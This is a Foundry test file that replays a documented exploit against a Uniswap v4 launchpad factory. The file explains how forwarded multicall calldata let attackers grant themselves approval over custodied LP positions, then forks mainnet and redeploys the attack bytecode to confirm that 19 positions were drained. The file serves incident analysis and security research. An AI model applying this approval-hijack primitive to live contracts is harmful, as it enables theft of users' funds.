// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Full incident: 19 Uniswap v4 LP positions drained across 2 victim custodians,
//            in 2 transactions by 2 attacker wallets (81 blocks / ~16 min apart).
//   Tx #1 : 0x9583e95d5c88c7966e269197f4b09022f26b7a27ad2c13660dda6774e3136d14 (block 25692311)
//           attacker 0xc94e23C5… burns 7 factory positions → 17,743.907229 USDC + 0.00721 WETH
//   Tx #2 : 0x962eb313a1290f9e1de336782d2e3fd0c6dc7b7816834bbef50278d28dbefb0b (block 25692392)
//           attacker 0xfc3fAcD6… burns the remaining 8 factory positions + 4 from a second
//           custodian 0xd5799fd8… (12 total) → ~1,010 USDC
//   Victim custodian #1 (factory) : 0xFB60CD0B36aD4bD839b91767a6Ad9055AB6aD825 (LaunchpadFactoryAuto)
//   Victim custodian #2           : 0xd5799fd858d9163e75d28b2e4f68cf8569167ad8
//   Position NFT                  : 0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e (Uniswap v4 Positions)
//
// LaunchpadFactoryAuto.launch() forwards attacker-supplied initCalldata/modifyCalldata into
// PositionManager.multicall() with the custodian as msg.sender. The custodian owns every
// launch's v4 LP NFT, so modifyCalldata = setApprovalForAll(exploit, true) grants the attacker
// operator rights over ALL held positions; the exploit then burns them (modifyLiquidities +
// TAKE_PAIR) and sweeps USDC/WETH/memecoins. Tx #2 runs the identical primitive with a DOUBLED
// payload — one setApprovalForAll grant per custodian — draining both victims in one shot.
//
// PoC: fork one block before tx#1; re-broadcast BOTH historical CREATE bytecodes in sequence
// (tx#1 as attacker1, then roll to tx#2's block and replay tx#2 as attacker2) and verify the
// full custody trail on-chain: factory 15 → 8 → 0, second custodian 4 → 0 (19 positions).

address constant ATTACKER = 0xc94e23C58b9b2998eDB7ABC8F99393FEaD985076; // tx#1
address constant ATTACKER2 = 0xfc3fAcD67138966aB0c841E905B0C4BCA1AbE92F; // tx#2
address constant FACTORY = 0xFB60CD0B36aD4bD839b91767a6Ad9055AB6aD825; // victim custodian #1
address constant CUSTODIAN2 = 0xD5799fd858D9163E75D28B2e4F68CF8569167AD8; // victim custodian #2
address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant POS_MGR = 0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e;

uint256 constant FORK_BLOCK = 25_692_310; // one block before tx#1
uint256 constant BLOCK_TX2 = 25_692_392; // tx#2's block (+81 blocks)

// Tx#1 proceeds to attacker1
uint256 constant EXPECTED_USDC = 17_743_907_229; // 17,743.907229 USDC
uint256 constant EXPECTED_WETH = 7_209_570_881_911_319; // 0.007209570881911319 WETH
// Tx#2 proceeds to attacker2 (positions were memecoin-heavy; small USDC leg)
uint256 constant EXPECTED_USDC_2 = 900_000_000; // conservative floor (~1,010 observed)

contract UnistreetsLaunchpadFactory_exp is BaseTestWithBalanceLog {
    function setUp() public {
        string memory rpc = vm.envOr("ETH_RPC_URL", string("https://eth.llamarpc.com"));
        try vm.envString("MAINNET_RPC_URL") returns (string memory m) {
            if (bytes(m).length > 0) rpc = m;
        } catch {}
        vm.createSelectFork(rpc, FORK_BLOCK);
        fundingToken = USDC;
        attacker = ATTACKER;
    }

    function _pos(address a) internal view returns (uint256) {
        // Uniswap v4 PositionManager is ERC-721; balanceOf(address) shares the ERC-20 selector.
        return IERC20(POS_MGR).balanceOf(a);
    }

    function _readCreateCode(string memory pathHex) internal view returns (bytes memory) {
        bytes memory raw = bytes(vm.readFile(pathHex));
        uint256 end = raw.length;
        while (end > 0 && (raw[end - 1] == 0x0a || raw[end - 1] == 0x0d || raw[end - 1] == 0x20)) {
            end--;
        }
        bytes memory trimmed = new bytes(end);
        for (uint256 i = 0; i < end; i++) {
            trimmed[i] = raw[i];
        }
        return vm.parseBytes(string(trimmed));
    }

    function _deploy(bytes memory code) internal returns (address deployed) {
        assembly {
            deployed := create(0, add(code, 0x20), mload(code))
        }
        require(deployed != address(0), "create failed");
    }

    function testExploit() public balanceLog {
        vm.label(ATTACKER, "Attacker1");
        vm.label(ATTACKER2, "Attacker2");
        vm.label(FACTORY, "LaunchpadFactoryAuto (victim #1)");
        vm.label(CUSTODIAN2, "Custodian #2 (victim)");
        vm.label(USDC, "USDC");
        vm.label(WETH, "WETH");
        vm.label(POS_MGR, "UniswapV4PositionManager");

        bytes memory code1 = _readCreateCode("calldata/attack_create.hex");
        bytes memory code2 = _readCreateCode("calldata/attack_create_2.hex");

        uint256 facPos0 = _pos(FACTORY);
        uint256 cust2Pos0 = _pos(CUSTODIAN2);
        emit log_named_uint("factory v4 positions (pre-attack)", facPos0);
        emit log_named_uint("custodian2 v4 positions (pre-attack)", cust2Pos0);

        // ---- Transaction #1 (attacker1) ----
        uint256 usdc1_0 = IERC20(USDC).balanceOf(ATTACKER);
        uint256 weth1_0 = IERC20(WETH).balanceOf(ATTACKER);
        vm.startPrank(ATTACKER, ATTACKER);
        address d1 = _deploy(code1);
        vm.stopPrank();
        uint256 tx1Usdc = IERC20(USDC).balanceOf(ATTACKER) - usdc1_0;
        uint256 tx1Weth = IERC20(WETH).balanceOf(ATTACKER) - weth1_0;
        uint256 facPos1 = _pos(FACTORY);
        emit log_named_address("tx#1 exploit", d1);
        emit log_named_uint("factory positions after tx#1", facPos1);
        emit log_named_decimal_uint("tx#1 USDC -> attacker1", tx1Usdc, 6);
        emit log_named_decimal_uint("tx#1 WETH -> attacker1", tx1Weth, 18);

        // ---- Transaction #2 (attacker2, 81 blocks later, second custodian) ----
        vm.roll(BLOCK_TX2);
        uint256 usdc2_0 = IERC20(USDC).balanceOf(ATTACKER2);
        vm.startPrank(ATTACKER2, ATTACKER2);
        address d2 = _deploy(code2);
        vm.stopPrank();
        uint256 tx2Usdc = IERC20(USDC).balanceOf(ATTACKER2) - usdc2_0;
        uint256 facPos2 = _pos(FACTORY);
        uint256 cust2Pos2 = _pos(CUSTODIAN2);
        emit log_named_address("tx#2 exploit", d2);
        emit log_named_uint("factory positions after tx#2", facPos2);
        emit log_named_uint("custodian2 positions after tx#2", cust2Pos2);
        emit log_named_decimal_uint("tx#2 USDC -> attacker2", tx2Usdc, 6);

        uint256 totalDrained = (facPos0 - facPos2) + (cust2Pos0 - cust2Pos2);
        emit log_named_uint("TOTAL positions drained (2 victims)", totalDrained);
        emit log_named_decimal_uint("TOTAL USDC to attackers", tx1Usdc + tx2Usdc, 6);

        // ---- Full-incident assertions (verified on-chain) ----
        require(facPos0 == 15, "factory should hold 15 positions pre-attack");
        require(cust2Pos0 == 4, "custodian2 should hold 4 positions pre-attack");
        require(tx1Usdc >= EXPECTED_USDC, "tx#1 USDC short");
        require(tx1Weth >= EXPECTED_WETH, "tx#1 WETH short");
        require(facPos1 == 8, "tx#1 should leave factory with 8 positions");
        require(facPos2 == 0, "tx#2 should empty the factory");
        require(cust2Pos2 == 0, "tx#2 should empty custodian2");
        require(tx2Usdc >= EXPECTED_USDC_2, "tx#2 USDC short");
        require(totalDrained == 19, "should drain 19 positions across 2 victims");
    }
}
